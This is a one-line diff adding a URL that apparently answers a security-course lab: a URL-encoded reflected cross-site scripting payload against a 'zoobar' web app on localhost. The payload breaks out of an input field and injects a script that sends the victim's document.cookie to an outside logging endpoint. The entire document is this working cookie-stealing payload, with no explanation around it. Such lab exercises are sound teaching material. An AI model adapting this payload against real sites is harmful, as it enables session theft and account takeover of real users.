@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3C%2Finput%3E%3Cscript%3Ejavascript%3Avoid((new%20Image()).src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2022%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Dshejialuo%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random())%3B%3C%2Fscript%3E%3Ca%20value%3D%22
